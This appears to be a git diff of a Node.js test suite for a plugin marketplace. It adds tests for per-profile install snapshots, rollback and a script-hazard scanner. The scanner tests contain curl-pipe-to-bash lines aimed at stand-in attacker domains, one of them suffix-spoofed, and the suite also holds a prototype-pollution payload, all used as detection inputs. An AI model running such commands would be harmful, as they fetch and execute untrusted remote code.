@@ -10,6 +10,11 @@ import { fileURLToPath } from "node:url";
 import { join, dirname, sep } from "node:path";
 import { tmpdir } from "node:os";
 
+for (const key of [
+  "GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE", "GIT_COMMON_DIR",
+  "GIT_OBJECT_DIRECTORY", "GIT_ALTERNATE_OBJECT_DIRECTORIES", "GIT_QUARANTINE_PATH", "GIT_PREFIX",
+]) delete process.env[key];
+
 // ---- mock 基建：临时 DSH_HOME（必须在 import lib 之前设置）----
 process.env.DSH_HOME = mkdtempSync(join(tmpdir(), "dsh-libtest-")).replace(/\\/g, "/");
 // 预写 installed.json（loadInstalled 在模块加载时执行）：注入一条已安装记录，
@@ -46,6 +51,15 @@ function check(name, actual, expected) {
     fail++;
     console.log(`FAIL ${name}: got ${JSON.stringify(actual)}, want ${JSON.stringify(expected)}`);
   }
+}
+
+async function waitFor(predicate, timeoutMs = 3000) {
+  const deadline = Date.now() + timeoutMs;
+  while (Date.now() < deadline) {
+    if (await predicate()) return true;
+    await new Promise((resolve) => setImmediate(resolve));
+  }
+  return await predicate();
 }
 
 // ---- mock：全局 fetch ----
@@ -230,7 +244,7 @@ function mockFetchCapture(payload, status = 200) {
   mkdirSync(cordisDir, { recursive: true });
   writeFileSync(join(cordisDir, "package.json"), JSON.stringify({ name: "fake-cordis-detect", version: "1.0.0", dsh: { client: {} } }), "utf8");
   check("detectType 非 bundle dsh 声明 → cordis-plugin（不变）", await lib.detectType(cordisDir), "cordis-plugin");
-  // 边界：bundle 声明但 install.ps1 也在根 → 声明优先（bundle 形态防脚本劫持，B1 同款语义）
+  // 边界：bundle 声明但 install.ps1 也在根 → 声明优先（bundle 形态防脚本劫持，同款语义）
   const bundleScriptDir = join(process.env.DSH_HOME, "bundle-script-detect");
   mkdirSync(bundleScriptDir, { recursive: true });
   writeFileSync(join(bundleScriptDir, "package.json"), JSON.stringify({
@@ -268,15 +282,14 @@ function mockFetchCapture(payload, status = 200) {
   check("cliHint 目录不存在返回 null", await lib.scanCliInstallHint(join(process.env.DSH_HOME, "nope"), "a/b"), null);
 
   // ---- dedupeReposByPkgName（pkg_name 冲突消解：已装优先，其次 Star 高者）----
-  // 不传 isInstalled 参数：触发默认闭包 `isInstalled = (r) => installedMap.has(r.full_name)`
-  // 与内部 `rank` 闭包（isInstalled 命中时 +1e12 权重）。
+  // isInstalled 显式注入，避免 domain 依赖模块内状态。
   const dupRepos = [
     { full_name: "a/low", name: "low", pkg_name: "shared-pkg", stargazers_count: 5 },
     { full_name: "a/high", name: "high", pkg_name: "shared-pkg", stargazers_count: 100 },
   ];
-  check("dedupe 默认参数 冲突保留高 Star", lib.dedupeReposByPkgName(dupRepos).repos.map((r) => r.full_name), ["a/high"]);
-  check("dedupe 默认参数 只留一条", lib.dedupeReposByPkgName(dupRepos).repos.length, 1);
-  check("dedupe 默认参数 返回 dropped 列表", lib.dedupeReposByPkgName(dupRepos).dropped, ["a/low"]);
+  check("dedupe 冲突保留高 Star", lib.dedupeReposByPkgName(dupRepos, () => false).repos.map((r) => r.full_name), ["a/high"]);
+  check("dedupe 冲突只留一条", lib.dedupeReposByPkgName(dupRepos, () => false).repos.length, 1);
+  check("dedupe 冲突返回 dropped 列表", lib.dedupeReposByPkgName(dupRepos, () => false).dropped, ["a/low"]);
   const dupInstalled = [
     { full_name: "x/inst", name: "inst", pkg_name: "p", stargazers_count: 0 },
     { full_name: "x/star", name: "star", pkg_name: "p", stargazers_count: 999 },
@@ -285,7 +298,7 @@ function mockFetchCapture(payload, status = 200) {
   check("dedupe 无 pkg_name 不冲突", lib.dedupeReposByPkgName([
     { full_name: "u/v", name: "v", stargazers_count: 1 },
     { full_name: "u/w", name: "w", stargazers_count: 2 },
-  ]).repos.map((r) => r.full_name), ["u/v", "u/w"]);
+  ], () => false).repos.map((r) => r.full_name), ["u/v", "u/w"]);
 
   // ==================== 文件 IO（临时 DSH_HOME）====================
   // 构造临时仓库目录（含 package.json）
@@ -430,6 +443,18 @@ function mockFetchCapture(payload, status = 200) {
         dependencies: { "dsh-plugin-marketplace": "github:bradeGithub/DSH-Plugins-Marketplace" },
         dsh: { profile: { bundles: ["dsh-plugin-marketplace"] } },
       }, null, 2), "utf8");
+      const snapshotProfile = join(process.env.DSH_HOME, "profiles", "snapshot");
+      const snapshotPaths = {
+        profileDir: snapshotProfile,
+        nodeModules: join(snapshotProfile, "node_modules"),
+        patchFile: join(snapshotProfile, "cordis.patch.yml"),
+        packageFile: join(snapshotProfile, "package.json"),
+      };
+      mkdirSync(snapshotProfile, { recursive: true });
+      writeFileSync(snapshotPaths.packageFile, JSON.stringify({
+        name: "snapshot-profile", version: "1.0.0",
+        dependencies: {}, dsh: { profile: { bundles: [] } },
+      }, null, 2), "utf8");
       // fixture：bundle 声明包（dsh.bundle.patch + 空操作入口，与 @linxin666/dsh-web-ui-all 同形态）
       // 场景 A：npm 等价回退来源（npmTarget 有值）→ 依赖声明用精确版本
       const fix = makeFixture("fake-bundle-pkg", "1.2.3", true);
@@ -457,6 +482,43 @@ function mockFetchCapture(payload, status = 200) {
       const profD = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
       check("仓库来源 bundle 依赖声明 github: 形态", profD.dependencies["fake-bundle-d"], "github:fake/bundle-repo-d");
       check("仓库来源 bundle 注册成功", resultD.bundle, true);
+
+      // 单次安装路径快照：即使当前 profile 仍是 web，显式传入的 snapshot 路径也必须
+      // 同时承载 manifest、node_modules 和结果 location，不能在 await 期间回读动态 profile。
+      const snapshotFix = makeFixture("fake-bundle-snapshot", "1.2.10", true);
+      const snapshotResult = await lib.installRepo({
+        type: "cordis-plugin", cacheDir: snapshotFix, repo: "fake/bundle-repo-snapshot", log: [],
+        answers: {}, logLine: () => {}, lang: "zh", envAllowList: [],
+        profilePaths: snapshotPaths,
+      });
+      const snapshotPkg = JSON.parse(readFileSync(snapshotPaths.packageFile, "utf8"));
+      const webAfterSnapshot = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
+      check("路径快照 bundle 写入显式 profile manifest", snapshotPkg.dependencies["fake-bundle-snapshot"], "github:fake/bundle-repo-snapshot");
+      check("路径快照 bundle 写入显式 bundles", snapshotPkg.dsh.profile.bundles.includes("fake-bundle-snapshot"), true);
+      check("路径快照 bundle 不污染当前 profile manifest", webAfterSnapshot.dependencies["fake-bundle-snapshot"], undefined);
+      check("路径快照 bundle 结果 location 使用显式 node_modules", snapshotResult.location, join(snapshotPaths.nodeModules, "fake-bundle-snapshot"));
+      check("路径快照 bundle 包目录位于显式 node_modules", existsSync(join(snapshotPaths.nodeModules, "fake-bundle-snapshot")), true);
+
+      // 失败回滚也必须使用同一 packageFile；否则会把 snapshot 的写前状态错误写回 web。
+      writeFileSync(join(stubDir, "mode"), "fail-nocreate", "utf8");
+      const snapshotFailFix = makeFixture("fake-bundle-snapshot-fail", "1.2.11", true);
+      let thrownSnapshot = null;
+      try {
+        await lib.installRepo({
+          type: "cordis-plugin", cacheDir: snapshotFailFix, repo: "fake/bundle-repo-snapshot-fail", log: [],
+          answers: {}, logLine: () => {}, lang: "zh", envAllowList: [],
+          profilePaths: snapshotPaths,
+        });
+      } catch (error) {
+        thrownSnapshot = String(error?.message ?? error);
+      }
+      const snapshotAfterFail = JSON.parse(readFileSync(snapshotPaths.packageFile, "utf8"));
+      const webAfterSnapshotFail = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
+      check("路径快照 bundle 失败仍明确报错", /仍未在 profile node_modules 解析到/.test(thrownSnapshot ?? ""), true);
+      check("路径快照 bundle 失败回滚显式 manifest", snapshotAfterFail.dependencies["fake-bundle-snapshot-fail"], undefined);
+      check("路径快照 bundle 失败保留显式 manifest 原内容", snapshotAfterFail.dependencies["fake-bundle-snapshot"], "github:fake/bundle-repo-snapshot");
+      check("路径快照 bundle 回滚不污染当前 profile", webAfterSnapshotFail.dependencies["fake-bundle-snapshot-fail"], undefined);
+      writeFileSync(join(stubDir, "mode"), "", "utf8");
 
       // 旧路径（type=cordis-plugin）bundle + entry 缺失 → 同样拦截（registerBundlePackage 共享校验）
       writeFileSync(join(stubDir, "entry"), "lib/index.js", "utf8");
@@ -586,7 +648,7 @@ function mockFetchCapture(payload, status = 200) {
       check("bundle 卸载移除 dsh.profile.bundles 条目", profAfter.dsh.profile.bundles.join(","), "dsh-plugin-marketplace,fake-bundle-d,fake-bundle-b");
       check("bundle 卸载删除包目录", existsSync(join(web, "node_modules", "fake-bundle-pkg")), false);
 
-      // 卸载降级路径（覆盖率 L4007）：pnpm remove 失败 → 手工清理 profile 条目 + 目录
+      // 卸载降级路径：pnpm remove 失败 → 手工清理 profile 条目 + 目录
       writeFileSync(join(stubDir, "mode"), "fail-remove", "utf8");
       await lib.saveInstalled("fake/bundle-repo-g", {
         type: "bundle", name: "fake-bundle-g", names: ["fake-bundle-g"],
@@ -617,7 +679,7 @@ function mockFetchCapture(payload, status = 200) {
       check("pnpm remove 失败 → 手工清理移除 dependencies", profAfterG.dependencies["fake-bundle-g"], undefined);
       check("pnpm remove 失败 → 手工清理移除 bundles 条目", (profAfterG.dsh.profile.bundles ?? []).includes("fake-bundle-g"), false);
       check("pnpm remove 失败 → 手工清理删除包目录", existsSync(join(web, "node_modules", "fake-bundle-g")), false);
-      // 覆盖率 L4007：writeProfileManifest 写失败 → catch 吞错（不影响目录删除兜底）
+      // writeProfileManifest 写失败 → catch 吞错（不影响目录删除兜底）
       // 先构造 manifest 有依赖 + 目录存在，再把 manifest 设为只读 → 手工清理写回失败
       const profRO = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
       profRO.dependencies["fake-bundle-ro"] = "1.3.0";
@@ -662,7 +724,7 @@ function mockFetchCapture(payload, status = 200) {
           type: "cordis-plugin", name: "legacy-web-plugin", names: ["legacy-web-plugin"],
           location: legacyPkg, version: "0.9.0", installedAt: Date.now(), envKeys: null,
         });
-        // K2 回归：旧 profile 的 cordis.patch.yml 条目必须被清理（而非当前 profile 的文件）
+        // 跨 profile 场景：旧 profile 的 cordis.patch.yml 条目必须被清理（而非当前 profile 的文件）
         const webPatch = join(web, "cordis.patch.yml");
         writeFileSync(webPatch, "[]\n- insert:\n    id: mp-legacy\n    name: \"legacy-web-plugin\"\n", "utf8");
         lib.setTargetProfile("desktop");
@@ -694,7 +756,7 @@ function mockFetchCapture(payload, status = 200) {
         }
       }
 
-      // K22 回归：无 names 字段的旧记录（name 为 -plugins 结尾的仓库目录名，L5 防呆
+      // 旧记录场景：无 names 字段的旧记录（name 为 -plugins 结尾的仓库目录名，安全校验
       // 放弃 name）跨 profile 卸载——targets 推断必须按 recordNm 锚点定位。修复前用
       // 当前 PROFILE_NM 判断，跨 profile 时 location 在旧 profile → 条件 false →
       // targets 空 → 走 uninstallNoTargets → 记录删除但目录/patch 残留（孤儿态）。
@@ -724,9 +786,9 @@ function mockFetchCapture(payload, status = 200) {
           let uStatusK = 0;
           let uBodyK = null;
           await uninstallK(unReqK, { writeHead: (x) => { uStatusK = x; }, end: (b) => { try { uBodyK = JSON.parse(b); } catch { uBodyK = null; } } });
-          check("K22 无 names 旧记录跨 profile 卸载响应 done", [uStatusK === 200, uBodyK?.status], [true, "done"]);
-          check("K22 无 names 旧记录实体目录已删", existsSync(legacyPkg), false);
-          check("K22 卸载移除安装记录", lib.hasInstalledRecord("fake/legacy-no-names"), false);
+          check("无 names 旧记录跨 profile 卸载响应 done", [uStatusK === 200, uBodyK?.status], [true, "done"]);
+          check("无 names 旧记录实体目录已删", existsSync(legacyPkg), false);
+          check("卸载移除安装记录", lib.hasInstalledRecord("fake/legacy-no-names"), false);
         } finally {
           lib.setTargetProfile("web");
         }
@@ -795,6 +857,102 @@ function mockFetchCapture(payload, status = 200) {
       check("非 bundle 插件不写 profile dependencies", profBeforePlain.dependencies["fake-plain-pkg"], undefined);
       check("非 bundle 插件结果无 bundle 标志", plainResult.bundle, false);
       check("非 bundle 插件写入 cordis.patch.yml insert", readFileSync(join(web, "cordis.patch.yml"), "utf8").includes("fake-plain-pkg"), true);
+
+      const snapshotPlainFix = makeFixture("fake-plain-snapshot", "0.0.2", false);
+      const snapshotPlainResult = await lib.installRepo({
+        type: "cordis-plugin", cacheDir: snapshotPlainFix, repo: "fake/plain-repo-snapshot", log: [],
+        answers: {}, logLine: () => {}, lang: "zh", envAllowList: [],
+        profilePaths: snapshotPaths,
+      });
+      check("路径快照普通插件复制到显式 node_modules", existsSync(join(snapshotPaths.nodeModules, "fake-plain-snapshot", "package.json")), true);
+      check("路径快照普通插件结果 location 使用显式 node_modules", snapshotPlainResult.location, join(snapshotPaths.nodeModules, "fake-plain-snapshot"));
+      check("路径快照普通插件写入显式 patch", readFileSync(snapshotPaths.patchFile, "utf8").includes("fake-plain-snapshot"), true);
+      check("路径快照普通插件不污染当前 profile patch", readFileSync(join(web, "cordis.patch.yml"), "utf8").includes("fake-plain-snapshot"), false);
+
+      // 路由级异步快照：CVE bulk 请求暂停期间切换 profile，后续 bundle 写入仍必须
+      // 使用请求开始时捕获的 web 路径，而不是恢复后的 desktop 路径。
+      {
+        const routeRepo = "fake/route-bundle";
+        const routeCache = join(process.env.DSH_HOME, "marketplace", "cache", "fake__route-bundle");
+        mkdirSync(routeCache, { recursive: true });
+        writeFileSync(join(routeCache, "package.json"), JSON.stringify({
+          name: "fake-route-bundle",
+          version: "1.4.0",
+          dsh: { bundle: { patch: "./cordis.patch.yml" } },
+          dependencies: { "fake-route-dep": "1.2.3" },
+        }, null, 2), "utf8");
+        writeFileSync(join(routeCache, "cordis.patch.yml"), "- insert:\n    - id: fake-route\n      name: fake-route-bundle\n", "utf8");
+
+        const registeredRoute = [];
+        lib.apply({ get: (s) => (s === "webServer" ? { register: (r) => registeredRoute.push(r) } : undefined), logger: { warn: () => {} }, slots: { inject: () => {} } });
+        const installHandler = registeredRoute.find((r) => r.path === "/api/marketplace/install")?.handler;
+        const originalFetch = globalThis.fetch;
+        let advisoryBody = null;
+        let advisoryReachedResolve;
+        const advisoryReached = new Promise((resolve) => { advisoryReachedResolve = resolve; });
+        let releaseAdvisory;
+        const advisoryRelease = new Promise((resolve) => { releaseAdvisory = resolve; });
+        globalThis.fetch = async (url, options) => {
+          if (String(url).includes("registry.npmjs.org/-/npm/v1/security/advisories/bulk")) {
+            advisoryBody = String(options?.body ?? "");
+            advisoryReachedResolve();
+            await advisoryRelease;
+            return { ok: true, status: 200, headers: { get: () => null }, body: null, arrayBuffer: async () => Buffer.from("{}") };
+          }
+          return originalFetch(url, options);
+        };
+        const bodyText = JSON.stringify({ repo: routeRepo, answers: {} });
+        let requestSent = false;
+        const routeRequest = {
+          method: "POST",
+          headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
+          socket: { remoteAddress: "127.0.0.1" },
+          url: "/api/marketplace/install",
+          [Symbol.asyncIterator]() {
+            return {
+              next: async () => requestSent
+                ? { value: undefined, done: true }
+                : ((requestSent = true), { value: Buffer.from(bodyText), done: false })
+            };
+          },
+        };
+        let routeStatus = 0;
+        let routeResponse = null;
+        const routeTask = installHandler(routeRequest, {
+          writeHead: (status) => { routeStatus = status; },
+          end: (body) => { try { routeResponse = JSON.parse(body); } catch { routeResponse = null; } },
+        });
+        try {
+          await advisoryReached;
+          check("安装路由快照确实跨过 advisory 异步边界", advisoryBody, JSON.stringify({ "fake-route-dep": ["1.2.3"] }));
+          lib.setTargetProfile("desktop");
+          releaseAdvisory();
+          await routeTask;
+          const desktop = join(process.env.DSH_HOME, "profiles", "desktop");
+          const webRouteManifest = JSON.parse(readFileSync(join(web, "package.json"), "utf8"));
+          const desktopManifestPath = join(desktop, "package.json");
+          const desktopRouteManifest = existsSync(desktopManifestPath)
+            ? JSON.parse(readFileSync(desktopManifestPath, "utf8"))
+            : {};
+          const installed = JSON.parse(readFileSync(join(process.env.DSH_HOME, "marketplace", "installed.json"), "utf8"));
+          const routeRecord = installed[routeRepo];
+          check("安装路由 profile 切换后仍返回 done", [routeStatus, routeResponse?.status], [200, "done"]);
+          check("安装路由 profile 快照结果类型为 bundle", routeResponse?.type, "bundle");
+          check("安装路由 profile 快照结果 location 留在 web", routeResponse?.location, join(web, "node_modules", "fake-route-bundle"));
+          check("安装路由 profile 快照写入 web manifest dependency", webRouteManifest.dependencies["fake-route-bundle"], "github:fake/route-bundle");
+          check("安装路由 profile 快照写入 web bundles", webRouteManifest.dsh.profile.bundles.includes("fake-route-bundle"), true);
+          check("安装路由 profile 快照创建 web 包目录", existsSync(join(web, "node_modules", "fake-route-bundle", "package.json")), true);
+          check("安装路由 profile 快照不写 web cordis patch", readFileSync(join(web, "cordis.patch.yml"), "utf8").includes("fake-route-bundle"), false);
+          check("安装路由 profile 快照不污染 desktop manifest", desktopRouteManifest.dependencies?.["fake-route-bundle"], undefined);
+          check("安装路由 profile 快照不污染 desktop 包目录", existsSync(join(desktop, "node_modules", "fake-route-bundle")), false);
+          check("安装路由记录 location 使用 web 快照", routeRecord?.location, join(web, "node_modules", "fake-route-bundle"));
+          check("安装路由记录 type 为 bundle", routeRecord?.type, "bundle");
+        } finally {
+          releaseAdvisory();
+          globalThis.fetch = originalFetch;
+          lib.setTargetProfile("web");
+        }
+      }
     } finally {
       process.env.PATH = savedPath;
       rmSync(stubDir, { recursive: true, force: true });
@@ -821,9 +979,9 @@ function mockFetchCapture(payload, status = 200) {
   globalThis.fetch = orig3;
   check("fetchRegistryRepos 数组", Array.isArray(reg), true);
 
-  // ---- L6 流式计数：chunked（无 content-length）时 32MB 上限不被绕过 ----
+  // ---- 响应大小边界 流式计数：chunked（无 content-length）时 32MB 上限不被绕过 ----
   // json()/arrayBuffer()/text() 会把整个 body 读入内存——修复前 chunked 响应
-  // 直接信任读取（安全守卫契约见 unit/security-guards.test.mjs 的 L6 段）。
+  // 直接信任读取（安全守卫契约见 unit/security-guards.test.mjs 的 响应大小边界 段）。
   // mock 响应只有 body 流（headers.get 恒 null = 无 content-length）：
   // 正常 chunk 读完 → .gz 源解析成功；超 32MB → 流式拦截 → 换下一源 → 全超限 null。
   {
@@ -864,9 +1022,18 @@ function mockFetchCapture(payload, status = 200) {
   renameSync(bundledDsh, bundledDsh + ".bak");
   try {
     // 前文 fetchAllRepos 的内置索引兜底会 fire-and-forget 落盘 list-cache/dsh.json，
-    // 先等其写完再清空，否则磁盘缓存层会先命中、覆盖不了搜索兜底路径。
-    await new Promise((r) => setTimeout(r, 500));
-    rmSync(join(process.env.DSH_HOME, "marketplace", "list-cache", "dsh.json"), { force: true });
+    // 先观察目标缓存写完再清空，否则磁盘缓存层会先命中、覆盖不了搜索兜底路径。
+    const dshCachePath = join(process.env.DSH_HOME, "marketplace", "list-cache", "dsh.json");
+    const cacheReady = await waitFor(() => {
+      try {
+        const cached = JSON.parse(readFileSync(dshCachePath, "utf8"));
+        return Array.isArray(cached.repos) && cached.repos.length > 100;
+      } catch {
+        return false;
+      }
+    });
+    check("内置索引回退缓存写入可观察完成", cacheReady, true);
+    rmSync(dshCachePath, { force: true });
     const orig5 = globalThis.fetch;
     globalThis.fetch = async () => ({ ok: false, status: 403, json: async () => ({}), text: async () => { throw new Error("text boom"); } });
     const degraded = await lib.fetchAllRepos("dsh");
@@ -912,7 +1079,7 @@ function mockFetchCapture(payload, status = 200) {
       return {
         method: "POST",
         headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
-        // 审查 S1：写端点升级 isWriteAllowed 后，mock req 需回环 socket 地址（连接层判定）
+        // 写端点升级 isWriteAllowed 后，mock req 需回环 socket 地址（连接层判定）
         socket: { remoteAddress: "127.0.0.1" },
         url: "/api/marketplace/restore/webdav",
         [Symbol.asyncIterator]() {
@@ -962,15 +1129,27 @@ function mockFetchCapture(payload, status = 200) {
   // e2e 已覆盖无 token 的 manualUrl 分支；此处补 token 分支：422 label 重试 + 成功创建。
   const fbSubmit = registered.find((h) => h.path === "/api/marketplace/feedback")?.handler;
   const fbToken = registered.find((h) => h.path === "/api/marketplace/feedback/token")?.handler;
+  const fbPending = registered.find((h) => h.path === "/api/marketplace/feedback/pending")?.handler;
   if (fbSubmit && fbToken) {
-    await new Promise((r) => setTimeout(r, 50)); // 等 apply 里 loadFeedback 异步读盘完成
+    const readPending = async () => {
+      let body = null;
+      await fbPending?.(
+        { method: "GET", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, socket: { remoteAddress: "127.0.0.1" }, url: "/api/marketplace/feedback/pending" },
+        { writeHead: () => {}, end: (value) => { try { body = JSON.parse(value); } catch { body = null; } } },
+      );
+      return body;
+    };
+    const feedbackLoaded = fbPending
+      ? await waitFor(async () => (await readPending())?.pending?.some((item) => item.repo === "none/feedback-repo"))
+      : false;
+    check("feedback 启动队列加载可观察完成", feedbackLoaded, true);
     const fbCall = async (handler, body) => {
       const bodyStr = JSON.stringify(body ?? {});
       let sent = false;
       const req = {
         method: "POST",
         headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
-        // 审查 S1：feedback/token 等写端点升级 isWriteAllowed 后需回环 socket
+        // feedback/token 等写端点升级 isWriteAllowed 后需回环 socket
         socket: { remoteAddress: "127.0.0.1" },
         url: "/api/marketplace/feedback",
         [Symbol.asyncIterator]() {
@@ -1122,7 +1301,7 @@ function mockFetchCapture(payload, status = 200) {
       }
     }
 
-    // 审查 T1（上游）：mock 远端更高版本 → 走真实 doSelfUpdate 执行路径（CLI 安装）——
+    // mock 远端更高版本 → 走真实 doSelfUpdate 执行路径（CLI 安装）——
     // 测试环境无 dsh CLI（Linux ENOENT / Windows 无 APPDATA 的 dsh.cmd），
     // CLI 失败或版本未变都会如实上报 500 failed，而非静默成功。
     // 前置 stub git：v1.5.1 起 CLI 失败会回退 doSelfUpdateByClone（真实 git clone +
@@ -1257,9 +1436,14 @@ function mockFetchCapture(payload, status = 200) {
     })();
     let listStatus = 0;
     let listBody = null;
+    const listWarnings = [];
+    const originalListWarn = console.warn;
+    console.warn = (...args) => listWarnings.push(args.join(" "));
     await listHandler({ method: "GET", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, url: "/api/marketplace/list?refresh=1" },
       { writeHead: (s) => { listStatus = s; }, end: (b) => { try { listBody = JSON.parse(b); } catch { listBody = null; } } });
+    console.warn = originalListWarn;
     globalThis.fetch = origList;
+    check("列表冲突由组合层汇总日志", listWarnings.some((message) => message.includes("pkg_name 冲突") && message.includes("隐藏 2 个")), true);
     check("list worker 标注 200", listStatus, 200);
     // 注：响应会叠加适配层（adaptor.json）补入的真实条目（如 yejiming/dsh-museai-tavern），
     // 断言按 mock 前缀 o/ 过滤，与适配层内容解耦。
@@ -1293,7 +1477,7 @@ function mockFetchCapture(payload, status = 200) {
     check("skills handler 存在", false, true);
   }
 
-  // ---- L7：safeAssign 防原型污染（执行行为）----
+  // ---- 原型污染边界：safeAssign 防原型污染（执行行为）----
   const polluted = JSON.parse('{"__proto__": {"polluted": true}, "a": 1}');
   const merged = lib.safeAssign({}, polluted, { b: 2 });
   check("safeAssign 剔除 __proto__ 键", Object.prototype.polluted, undefined);
@@ -1303,7 +1487,7 @@ function mockFetchCapture(payload, status = 200) {
   check("safeAssign 剔除 constructor（own 检查）", Object.hasOwn(lib.safeAssign({}, JSON.parse('{"constructor": {"x": 1}}')), "constructor"), false);
   check("safeAssign 剔除 prototype（own 检查）", Object.hasOwn(lib.safeAssign({}, JSON.parse('{"prototype": {"x": 1}}')), "prototype"), false);
 
-  // ---- L6：fetchRegistryRepos 对超大 Content-Length 弃用该源 ----
+  // ---- 响应大小边界：fetchRegistryRepos 对超大 Content-Length 弃用该源 ----
   {
     const orig6 = globalThis.fetch;
     globalThis.fetch = async () => ({
@@ -1504,7 +1688,7 @@ function mockFetchCapture(payload, status = 200) {
   const evilHit = await lib.scanScriptHazards(mkHaz("evil2.sh",
     "curl -s https://evil.example/x.sh | bash"));
   check("非白名单域名保持 critical", evilHit[0].severity, "critical");
-  // 白名单边界锚定（自审 H1）：后缀攻击域（官方域.攻击者域）不是官方域——
+  // 白名单边界锚定（安全边界）：后缀攻击域（官方域.攻击者域）不是官方域——
   // 子串匹配会误降级 medium，弱提示真实攻击面
   const suffixAttack = await lib.scanScriptHazards(mkHaz("suffix.sh",
     "curl -s https://raw.githubusercontent.com.evil.io/x.sh | bash"));
@@ -1681,7 +1865,7 @@ function mockFetchCapture(payload, status = 200) {
 
   // 9. CLI 指令 npm 等价回退纯函数（issue #54 archify 教训）
   check("isNpmCliTarget scope 包带版本", lib.isNpmCliTarget("@tt-a1i/archify-dsh@0.1.0"), true);
-  // 跨 profile 锚点定位（自审 H5）：resolveRecordNodeModules 按记录 location 定位真实落点
+  // 跨 profile 锚点定位（路径边界）：resolveRecordNodeModules 按记录 location 定位真实落点
   {
     const profilesRoot = join(process.env.DSH_HOME, "profiles");
     const webNm = join(profilesRoot, "web", "node_modules");
@@ -1704,7 +1888,7 @@ function mockFetchCapture(payload, status = 200) {
       check("锚点：非法 profile 名回退",
         lib.resolveRecordNodeModules({ location: join(profilesRoot, "..", "evil", "node_modules", "x") }),
         join(profilesRoot, "desktop", "node_modules"));
-      // 七轮审计：CLI 记录（无 location）用安装时刻保存的 profile 提示定位
+      // CLI 记录（无 location）用安装时刻保存的 profile 提示定位
       check("锚点：CLI 记录 profile 提示定位到提示的 profile",
         lib.resolveRecordNodeModules({ location: null, profile: "legacy" }), legacyNm);
       // 提示非法（穿越形态）→ 回退当前 PROFILE_NM
@@ -1726,7 +1910,7 @@ function mockFetchCapture(payload, status = 200) {
   check("npmTargetName 裸包剥版本", lib.npmTargetName("dsh-web-ui-all@1.2.3"), "dsh-web-ui-all");
   check("npmTargetName 无版本原样", lib.npmTargetName("@a/b"), "@a/b");
 
-  // ---- findPluginRoots（覆盖矩阵审计：50 个导出中唯一零测试引用）----
+  // ---- findPluginRoots（导出覆盖检查：50 个导出中唯一零测试引用）----
   // 皮肤/多包仓库的插件根识别：只收 looksLikeDshPlugin===true 的清单目录，
   // 普通 npm 子包/点目录/node_modules 不被误收；插件根内不再深入子目录。
   const prRoot = mkFixture("pluginroots", {
